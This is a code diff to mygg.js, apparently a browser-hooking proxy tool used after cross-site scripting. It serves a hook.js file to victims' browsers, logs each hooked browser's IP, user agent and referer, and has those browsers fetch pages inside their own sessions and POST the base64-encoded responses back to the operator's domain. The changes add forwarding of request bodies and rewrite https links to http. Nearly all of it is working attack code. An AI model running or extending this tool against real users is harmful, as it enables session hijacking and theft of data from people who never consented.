@@ -3,11 +3,13 @@ const config = {
     // Change web_domain to your domain.
     web_domain: 'example.com',           
     web_interface: '0.0.0.0',
-    web_port: 443,
-    web_protocol: 'https',
+    web_port: 80,
+    web_protocol: 'http',
     polling_time: 2000,
     key: './server.key',
     cert: './server.crt',
+    // IP-addresses that should not get hooked, e.g. your own.
+    do_not_hook: ['127.0.0.1'],
     // Either set proxy_ip to 127.0.0.1 and use ssh+portforwarding (if mygg.js runs remote)
     // or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips.
     proxy_interface: '127.0.0.1',
@@ -43,22 +45,44 @@ proxy.createServer(function (req, res) {
     }
 
     console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
-
-    /* Get the requested resouces after domain name */
     console.log("[+] Requesting : " + req.url)
 
-    /* Add new task */
-    var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": req.body}
-	
-    tasks_pending.push(new_task);
+    /* Check if incoming request contains a body */
+    if (req.headers['content-length'] > 0) {
+        var body = '';
+        req.on('data', function (chunk) {
+            body += chunk;
+        });
+        req.on('end', function () {
+            body_encoded = Buffer.from(body).toString('base64');
+            var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": body_encoded}
+            tasks_pending.push(new_task);
+            task_callbacks[new_task.id] = function (result) {
+                var body_decoded = Buffer.from(result.body, 'base64');
+                var body_fixed = https2http(body_decoded);
+                var headers_decoded = Buffer.from(result.headers, 'base64');
+                var headers_fixed = stripHeaders(str2json(headers_decoded))
+                var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);
+                console.log("[+] Received status:\n" + result.status);
+                console.log("[+] Received headers:\n" + headers_decoded);
+                console.log("[+] Received body:\n" + body_decoded);
+                console.log("###############################################################");
+
+                res.writeHead(result.status, headers_fixed);
+                res.end(body_fixed);
+            };
+        });
+	} else {
+        var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": null}
+        tasks_pending.push(new_task);
+    }    
 
     task_callbacks[new_task.id] = function (result) {
         var body_decoded = Buffer.from(result.body, 'base64');
         var body_fixed = https2http(body_decoded);
         var headers_decoded = Buffer.from(result.headers, 'base64');
         var headers_fixed = stripHeaders(str2json(headers_decoded))
-        var headers_fixed = fixContentLen(headers_fixed, body_fixed.length);
-
+        var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);
         console.log("[+] Received status:\n" + result.status);
         console.log("[+] Received headers:\n" + headers_decoded);
         console.log("[+] Received body:\n" + body_decoded);
@@ -85,12 +109,13 @@ const https_options = {
 };
 web.createServer(https_options, function (req, res) {
     var ipaddr = req.connection.remoteAddress;
-    var useragent = req.headers['user-agent']; 
+    var useragent = req.headers['user-agent'];
+    var referer = req.headers['referer'];
     /* Serves the hook file */
     if (req.url == '/hook.js') {
         res.writeHead(200, {"Content-Type": "application/javascript"});
         res.end(hook_file);
-        console.log("[+] Hooked new browser [" + ipaddr + "] [" + useragent + "]");
+        console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
     /* Hooked browser asks mygg if there are any new jobs for it */
     } else if (req.url == '/polling') {
         res.setHeader('Access-Control-Allow-Origin', '*')
@@ -159,7 +184,7 @@ function https2http(body) {
     return body.toString().replace(/https\:\/\//g, "http://");
 }
 
-function fixContentLen(headers, new_length) {
+function fixContentLength(headers, new_length) {
     headers['Content-Length'] = new_length;
     return headers;
 }
@@ -189,8 +214,6 @@ function makeRequest(id, method, url, head, body) {
     var target_http = new XMLHttpRequest();
     target_http.onreadystatechange = function() {       
         if (target_http.readyState == 4 && target_http.status == 200) {
-            console.log("url: " + url);
-            console.log("responseURL: " + target_http.responseURL);
             var mygg_http = new XMLHttpRequest();
             mygg_http.open("POST", "//${config.web_domain}/responses", true);
             mygg_http.setRequestHeader("Content-Type", "application/json");
@@ -198,7 +221,6 @@ function makeRequest(id, method, url, head, body) {
             var resp_body = btoa(target_http.responseText);
             var resp_headers = btoa(target_http.getAllResponseHeaders());
             // Checking if the browser got a redirect
-            console.log("GET PATH: " + getPath(url))
             if (getPath(url) == getPath(target_http.responseURL)) {
                 var obj = {"id": id.toString(), "url": url, "status": resp_status, "headers": resp_headers, "body": resp_body}
             } else {
@@ -213,8 +235,8 @@ function makeRequest(id, method, url, head, body) {
     //for (var key in head) {
      //   target_http.setRequestHeader(key, head[key]) 
     //}
-    if (body != null) {
-        target_http.send(body);
+    if (body) {
+        target_http.send(atob(body));
     } else {
         target_http.send();
     }
